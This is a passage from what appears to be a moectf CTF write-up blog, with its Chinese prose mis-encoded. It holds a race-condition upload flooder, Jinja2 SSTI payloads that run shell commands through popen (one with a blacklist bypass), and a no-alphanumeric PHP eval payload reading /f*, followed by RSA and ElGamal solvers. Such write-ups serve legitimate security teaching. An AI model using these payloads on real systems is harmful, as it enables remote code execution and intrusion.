ç–¯ç‹‚è®¿é—®:&quot;</span>, TARGET)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(THREADS):</span><br><span class="line">        threading.Thread(target=fetcher, args=(i,), daemon=<span class="literal">True</span>).start()</span><br><span class="line">    threading.Thread(target=reporter, daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        stop.<span class="built_in">set</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] åœæ­¢ã€‚&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç›´åˆ°è¿”å›çš„å­—èŠ‚æœ‰gif89aä¸ºæ­¢,èšå‰‘è¿2.php</p>
<p><img src="D:\typora_pic\image-20250826171107490.png" alt="image-20250826171107490"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">### 26.**ç¬¬äºŒåç«  å¹½å†¥è¡€æµ·Â·å¹»è¯­å¿ƒé­”**</span><br><span class="line"></span><br><span class="line">ç»™äº†app.py</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from flask import Flask, request, render_template, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    if &#x27;username&#x27; in request.args or &#x27;password&#x27; in request.args:</span><br><span class="line">        username = request.args.get(&#x27;username&#x27;, &#x27;&#x27;)</span><br><span class="line">        password = request.args.get(&#x27;password&#x27;, &#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">        if not username or not password:</span><br><span class="line">            login_msg = &quot;&quot;&quot;</span><br><span class="line">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;result-title&quot;&gt;é˜µæ³•åé¦ˆ&lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;ç”¨æˆ·åæˆ–å¯†ç ä¸èƒ½ä¸ºç©º&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &quot;&quot;&quot;</span><br><span class="line">        else:</span><br><span class="line">            login_msg = render_template_string(f&quot;&quot;&quot;</span><br><span class="line">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;result-title&quot;&gt;é˜µæ³•åé¦ˆ&lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;æ¬¢è¿: &#123;username&#125;&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &quot;&quot;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        login_msg = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    return render_template(&quot;index.html&quot;, login_msg=login_msg)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=80)</span><br></pre></td></tr></table></figure>

<p>usernameå¯æ§å¹¶ä¸”å­˜åœ¨ssti</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[141].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250907122553225.png" alt="image-20250907122553225"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[141].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250907122617458.png" alt="image-20250907122617458"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;a53a1e79-698c-d929-a976-4afcbddd6b32&#125;</span><br></pre></td></tr></table></figure>

<h3 id="27-ç¬¬äºŒåä¸€ç« -å¾€ç”Ÿæ¼©æ¶¡Â·è¨€çµæ­»å±€"><a href="#27-ç¬¬äºŒåä¸€ç« -å¾€ç”Ÿæ¼©æ¶¡Â·è¨€çµæ­»å±€" class="headerlink" title="27.ç¬¬äºŒåä¸€ç«  å¾€ç”Ÿæ¼©æ¶¡Â·è¨€çµæ­»å±€"></a>27.<strong>ç¬¬äºŒåä¸€ç«  å¾€ç”Ÿæ¼©æ¶¡Â·è¨€çµæ­»å±€</strong></h3><p>è¿™é¢˜å¤šäº†ä¸ªwaf</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;global&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            login_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;é˜µæ³•åé¦ˆ&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;ç”¨æˆ·åæˆ–å¯†ç ä¸èƒ½ä¸ºç©º&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            login_msg = render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;é˜µæ³•åé¦ˆ&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;æ¬¢è¿ï¼š<span class="subst">&#123;username&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> blk <span class="keyword">in</span> blacklist:</span><br><span class="line">                <span class="keyword">if</span> blk <span class="keyword">in</span> username:</span><br><span class="line">                    login_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;result-title&quot;&gt;é˜µæ³•åé¦ˆ&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;Error&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        login_msg = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, login_msg=login_msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print (cycler.next[&#x27;_&#x27;+&#x27;_&#x27;+&#x27;g&#x27;&#x27;lobals&#x27;+&#x27;_&#x27;+&#x27;_&#x27;].os.popen(&#x27;ls /&#x27;)).read()%&#125;</span><br><span class="line">app bin dev entrypoint.sh etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print (cycler.next[&#x27;_&#x27;+&#x27;_&#x27;+&#x27;g&#x27;&#x27;lobals&#x27;+&#x27;_&#x27;+&#x27;_&#x27;].os.popen(&#x27;cat /f*&#x27;)).read()%&#125;</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250907125325998.png" alt="image-20250907125325998"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;0e58bf14-90e9-97dd-a2e8-64f6708bea38&#125;</span><br></pre></td></tr></table></figure>

<h3 id="28-è¿™æ˜¯â€¦Webshellï¼Ÿ"><a href="#28-è¿™æ˜¯â€¦Webshellï¼Ÿ" class="headerlink" title="28.è¿™æ˜¯â€¦Webshellï¼Ÿ"></a>28.<strong>è¿™æ˜¯â€¦Webshellï¼Ÿ</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ— æ•°å­—æ— å­—æ¯rce</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15404150.html">https://www.cnblogs.com/pursue-security/p/15404150.html</a></p>
<p>ä¸€èˆ¬éƒ½æ˜¯é€šè¿‡å¼‚æˆ–æˆ–è€…å–å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);</span><br><span class="line">POST:</span><br><span class="line">_=system(cat /f*);</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250907131432404.png" alt="image-20250907131432404"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;0f39c886-86fe-94d9-1247-062f339c9b5f&#125;</span><br></pre></td></tr></table></figure>

<h3 id="29-è¿™æ˜¯â€¦Webshell-revenge"><a href="#29-è¿™æ˜¯â€¦Webshell-revenge" class="headerlink" title="29.è¿™æ˜¯â€¦Webshell?_revenge"></a>29.<strong>è¿™æ˜¯â€¦Webshell?_revenge</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">30</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error: shell length exceeded&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]/&quot;</span>, <span class="variable">$shell</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error: shell not allowed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-å¯†ç "><a href="#3-å¯†ç " class="headerlink" title="3.å¯†ç "></a>3.å¯†ç </h2><h3 id="1-Cryptoå…¥é—¨æŒ‡åŒ—"><a href="#1-Cryptoå…¥é—¨æŒ‡åŒ—" class="headerlink" title="1.Cryptoå…¥é—¨æŒ‡åŒ—"></a>1.<strong>Cryptoå…¥é—¨æŒ‡åŒ—</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›¿æ¢ä¸ºä½ çš„çœŸå®å‚æ•°</span></span><br><span class="line">p = <span class="number">11540963715962144951763578255357417528966715904849014985547597657698304891044841099894993117258279094910424033273299863589407477091830213468539451196239863</span></span><br><span class="line">c1 = <span class="number">6652053553055645358275362259554856525976931841318251152940464543175108560132949610916012490837970851191204144757409335011811874896056430105292534244732863</span></span><br><span class="line">c2 = <span class="number">2314913568081526428247981719100952331444938852399031826635475971947484663418362533363591441216570597417789120470703548843342170567039399830377459228297983</span></span><br><span class="line">x = <span class="number">8010957078086554284020959664124784479610913596560035011951143269559761229114027738791440961864150225798049120582540951874956255115884539333966429021004214</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ElGamalè§£å¯†æ­¥éª¤</span></span><br><span class="line">s = <span class="built_in">pow</span>(c1, x, p)            <span class="comment"># s = c1^x mod p</span></span><br><span class="line">s_inv = <span class="built_in">pow</span>(s, -<span class="number">1</span>, p)        <span class="comment"># è®¡ç®—sçš„æ¨¡é€†</span></span><br><span class="line">m = (c2 * s_inv) % p         <span class="comment"># è®¡ç®—æ˜æ–‡æ•´æ•°m</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è½¬æ¢ä¸ºå­—èŠ‚ä¸²ï¼Œè§£ç ä¸ºå­—ç¬¦ä¸²ï¼ˆä¸€èˆ¬UTF-8ï¼‰</span></span><br><span class="line">flag_bytes = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag_bytes.decode())</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250809145935983.png" alt="image-20250809145935983"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;th1s_1s_y0ur_f1rst_ElG@m@l&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-baby-next"><a href="#2-baby-next" class="headerlink" title="2.baby_next"></a>2.baby_next</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> isqrt, next_prime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># é¢˜ç›®ç»™å®šçš„å‚æ•°</span></span><br><span class="line">n = <span class="number">96742777571959902478849172116992100058097986518388851527052638944778038830381328778848540098201307724752598903628039482354215330671373992156290837979842156381411957754907190292238010742130674404082688791216045656050228686469536688900043735264177699512562466087275808541376525564145453954694429605944189276397</span></span><br><span class="line">c = <span class="number">17445962474813629559693587749061112782648120738023354591681532173123918523200368390246892643206880043853188835375836941118739796280111891950421612990713883817902247767311707918305107969264361136058458670735307702064189010952773013588328843994478490621886896074511809007736368751211179727573924125553940385967</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—nçš„å¹³æ–¹æ ¹ä½œä¸ºpçš„ä¼°è®¡å€¼</span></span><br><span class="line">sqrt_n = isqrt(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰æœç´¢èŒƒå›´ï¼šæ ¹æ®ç´ æ•°é—´éš”ç†è®ºï¼Œpåº”ä½äº sqrt(n) - 4e7 é™„è¿‘</span></span><br><span class="line">search_range = <span class="number">40000000</span>  <span class="comment"># 4000ä¸‡</span></span><br><span class="line">start = <span class="built_in">max</span>(<span class="number">2</span>, sqrt_n - search_range)  <span class="comment"># æœç´¢èµ·ç‚¹</span></span><br><span class="line">end = sqrt_n                            <span class="comment"># æœç´¢ç»ˆç‚¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ­¥éª¤1ï¼šåœ¨ä¼°ç®—èŒƒå›´å†…æœç´¢èƒ½æ•´é™¤nçš„ç´ æ•°</span></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line">p = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> candidate <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">    <span class="comment"># æ£€æŸ¥æ˜¯å¦æ•´é™¤</span></span><br><span class="line">    <span class="keyword">if</span> n % candidate == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># éªŒè¯å€™é€‰æ•°æ˜¯å¦ä¸ºç´ æ•°ï¼ˆå°ç´ æ•°å¿«é€ŸéªŒè¯ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> next_prime(candidate - <span class="number">1</span>) == candidate:</span><br><span class="line">            p = candidate</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># æ¯å¤„ç†10ä¸‡ä¸ªæ•°å­—æ˜¾ç¤ºè¿›åº¦</span></span><br><span class="line">    <span class="keyword">if</span> (candidate - start) % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">        progress = (candidate - start) / (end - start) * <span class="number">100</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æ‰«æè¿›åº¦: <span class="subst">&#123;progress:<span class="number">.2</span>f&#125;</span>%&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;æœªæ‰¾åˆ°åˆé€‚çš„ç´ æ•°å› å­pï¼Œå°è¯•æ‰©å¤§æœç´¢èŒƒå›´&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—å¦ä¸€ä¸ªç´ æ•°å› å­q</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;æ‰¾åˆ°å› å­: p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ­¥éª¤2ï¼šéªŒè¯qç¡®å®æ˜¯pçš„ç¬¬114514ä¸ªåç»§ç´ æ•°</span></span><br><span class="line">current = p</span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">114515</span>):  <span class="comment"># éœ€è¦114514æ¬¡next_prime</span></span><br><span class="line">    current = next_prime(current)</span><br><span class="line">    <span class="comment"># æ˜¾ç¤ºè¿›åº¦</span></span><br><span class="line">    <span class="keyword">if</span> count % <span class="number">10000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;éªŒè¯è¿›åº¦: <span class="subst">&#123;count&#125;</span>/114514&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> current != q:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;qä¸æ˜¯pçš„åç»§ç¬¬114514ä¸ªç´ æ•°ï¼Œè¯·æ£€æŸ¥æœç´¢é€»è¾‘&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;éªŒè¯é€šè¿‡ï¼šqæ˜¯pçš„ç¬¬114514ä¸ªåç»§ç´ æ•°&quot;</span>)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;è§£å¯†åçš„Flag:&quot;</span>, flag.decode())</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250809161214353.png" alt="image-20250809161214353"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;vv0W_p_m1nu5_q_i5_r34l1y_sm4lI&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-ez-square"><a href="#3-ez-square" class="headerlink" title="3.ez_square"></a>3.<strong>ez_square</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse, isPrime</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥æ•°æ®</span></span><br><span class="line">n = <span class="number">83917281059209836833837824007690691544699901753577294450739161840987816051781770716778159151802639720854808886223999296102766845876403271538287419091422744267873129896312388567406645946985868002735024896571899580581985438021613509956651683237014111116217116870686535030557076307205101926450610365611263289149</span></span><br><span class="line">c = <span class="number">69694813399964784535448926320621517155870332267827466101049186858004350675634768405333171732816667487889978017750378262941788713673371418944090831542155613846263236805141090585331932145339718055875857157018510852176248031272419248573911998354239587587157830782446559008393076144761176799690034691298870022190</span></span><br><span class="line">hint = <span class="number">5491796378615699391870545352353909903258578093592392113819670099563278086635523482350754035015775218028095468852040957207028066409846581454987397954900268152836625448524886929236711403732984563866312512753483333102094024510204387673875968726154625598491190530093961973354413317757182213887911644502704780304</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. æšä¸¾ k æ‰¾åˆ° (p+q)</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    s2 = hint + k * n  <span class="comment"># s^2 = hint + k*n</span></span><br><span class="line">    s = math.isqrt(s2)</span><br><span class="line">    <span class="keyword">if</span> s * s == s2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Found s = p+q with k=<span class="subst">&#123;k&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> 